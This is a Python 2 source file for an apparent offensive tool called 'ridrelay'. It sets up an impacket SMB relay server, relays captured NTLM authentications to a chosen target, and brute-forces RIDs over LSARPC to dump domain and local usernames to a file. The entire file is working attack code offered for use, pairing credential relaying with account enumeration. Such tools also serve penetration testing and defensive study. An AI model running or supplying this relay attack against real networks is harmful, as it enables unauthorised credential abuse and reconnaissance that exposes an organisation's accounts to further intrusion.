import argparse
import sys
import logging
from threading import Thread
from time import sleep

from impacket import smb, smb3
from impacket.dcerpc.v5 import transport, lsat, lsad
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
from impacket.examples import logger
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.smbconnection import SMBConnection

got_usernames = False


class SMBAttack(Thread):
    def __init__(self, config, SMBClient, username):
        Thread.__init__(self)
        self.daemon = True
        if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
            self.__SMBConnection = SMBConnection(existingConnection=SMBClient)
        else:
            self.__SMBConnection = SMBClient
        self.config = config

    def run(self):
        global got_usernames
        rpctransport = transport.SMBTransport(self.__SMBConnection.getRemoteHost(), filename=r'\lsarpc',
                                              smb_connection=self.__SMBConnection)
        dce = rpctransport.get_dce_rpc()
        maxRid = 50000
        dce.connect()

        dce.bind(lsat.MSRPC_UUID_LSAT)
        resp = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']

        # Get Domain Sid if we are in a domain
        logging.info('Dumping usernames')
        resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle,
                                                 lsad.POLICY_INFORMATION_CLASS.PolicyPrimaryDomainInformation)
        if resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid']:
            domainSid = resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid'].formatCanonical()
        else:
            # If we get an exception, maybe we aren't in a domain. Get local Sid instead
            logging.info('Target not joined to a domain. Getting local accounts instead')
            resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle,
                                                     lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
            domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()

        fh = None
        if self.config.outputFile:
            try:
                fh = open(self.config.outputFile, 'w+')
            except Exception:
                logging.exception('Could not open file for writing')

        soFar = 0
        SIMULTANEOUS = 1000
        for j in range(maxRid / SIMULTANEOUS + 1):
            if (maxRid - soFar) / SIMULTANEOUS == 0:
                sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
            else:
                sidsToCheck = SIMULTANEOUS

            if sidsToCheck == 0:
                break

            sids = list()
            for i in xrange(soFar, soFar + sidsToCheck):
                sids.append(domainSid + '-%d' % i)
            try:
                lsat.hLsarLookupSids(dce, policyHandle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            except DCERPCException as e:
                if str(e).find('STATUS_NONE_MAPPED') >= 0:
                    soFar += SIMULTANEOUS
                    continue
                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                    resp = e.get_packet()
                else:
                    raise

            for n, item in enumerate(resp['TranslatedNames']['Names']):
                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
                    line = "%d: %s\\%s (%s)" % (
                    soFar + n, resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'],
                    SID_NAME_USE.enumItems(item['Use']).name)
                    print line
                    if fh:
                        fh.write(line + '\n')

            soFar += SIMULTANEOUS

        if fh:
            fh.close()
        dce.disconnect()
        got_usernames = True


if __name__ == '__main__':
    RELAY_SERVERS = (SMBRelayServer,)  # TODO: Maybe fix HTTP redirects later
    ATTACKS = {'SMB': SMBAttack}

    parser = argparse.ArgumentParser(description='A sure fire way to enumerate domain usernames')
    parser.add_argument('--target', '-t', metavar='TARGET', required=True, help='An IP address value that states which '
                                                                                'target to relay TO')
    parser.add_argument('--out-file', '-o', metavar='OUTFILE', help='The file to output usernames to.')
    args = parser.parse_args()

    logger.init()
    print 'ridrelay v0.1 - Get domain usernames by relaying low priv creds!\n'

    logging.getLogger().setLevel(logging.INFO)
    logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    codec = sys.getdefaultencoding()

    targetSystem = TargetsProcessor(singleTarget=args.target, protocolClients=PROTOCOL_CLIENTS)

    threads = set()

    for server in RELAY_SERVERS:
        # Set up config
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(False, None)
        c.setTargets(targetSystem)
        c.setEncoding(codec)
        c.setAttacks(ATTACKS)
        c.setOutputFile(args.out_file)
        c.setSMB2Support(True)
        c.setInterfaceIp('')
        c.setMode('REDIRECT')
        c.setRedirectHost(True)

        s = server(c)
        s.start()
        threads.add(s)

    print ""
    logging.info("Servers started, waiting for connections")
    try:
        while not got_usernames:
            sleep(1)
    except KeyboardInterrupt:
        logging.info("Exiting... Remember to stop Responder if you need to")
    except Exception:
        pass

    for s in threads:
        del s

    sys.exit(0)
